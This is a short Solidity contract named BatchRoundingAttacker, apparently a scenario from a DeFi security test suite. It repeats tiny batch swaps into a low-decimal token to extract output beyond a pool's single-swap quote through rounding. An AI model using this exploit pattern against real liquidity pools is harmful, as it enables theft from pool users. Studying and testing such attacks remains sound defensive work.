// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { KestrelPool } from "kestrel/KestrelPool.sol";
import { PrecisionAmplifier, IAmplifiedOperation } from "../helpers/PrecisionAmplifier.sol";
import { PoolBatchOp } from "../helpers/AmplifiedOps.sol";

/// @notice SC07a attacker: drives the {PrecisionAmplifier} over tiny single-step batch swaps
///         into a low-decimal output token and reports the output taken beyond the pool's own
///         single-swap quote.
contract BatchRoundingAttacker {
    /// @notice Operation id used with the amplifier.
    bytes32 public constant OP = keccak256("pool.batch.tiny");
    /// @notice The amplifier.
    PrecisionAmplifier public immutable amplifier;
    /// @notice The batch-swap operation (it must hold the input tokens).
    PoolBatchOp public immutable op;

    /// @param pool Target pool.
    /// @param tokenIn Token sold.
    /// @param tokenOut Token bought (the low-decimal side).
    constructor(KestrelPool pool, address tokenIn, address tokenOut) {
        amplifier = new PrecisionAmplifier();
        op = new PoolBatchOp(pool, tokenIn, tokenOut);
    }

    /// @notice Swap `amount` of the input token `n` times through the batch path.
    /// @param n Repetitions.
    /// @param amount Input per swap.
    /// @return extracted Output units taken beyond the single-swap quote.
    function run(uint256 n, uint256 amount) external returns (uint256 extracted) {
        extracted = amplifier.amplify(OP, IAmplifiedOperation(address(op)), n, amount);
    }
}
